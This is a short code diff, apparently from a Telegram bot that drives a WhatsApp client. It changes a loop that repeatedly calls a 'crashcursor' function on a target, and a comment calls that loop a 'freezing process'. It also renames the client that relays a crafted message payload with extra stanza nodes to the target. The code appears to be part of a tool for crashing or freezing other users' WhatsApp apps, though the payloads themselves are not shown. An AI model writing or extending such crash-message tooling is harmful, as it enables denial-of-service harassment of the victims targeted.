@@ -612,7 +612,7 @@ bot.command("xranz", checkWhatsAppConnection, async ctx => {
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 3; i++) {
+  for (let i = 0; i < 2; i++) {
     await crashcursor(target, { ptcp: true });
   }
 
@@ -1900,7 +1900,7 @@ ticket_id: crypto.randomBytes(16),
 }
 }
 
-await cay.relayMessage(target, messagePayload, {
+await cella.relayMessage(target, messagePayload, {
 additionalNodes: stanza,
 participant: { jid : target }
 });
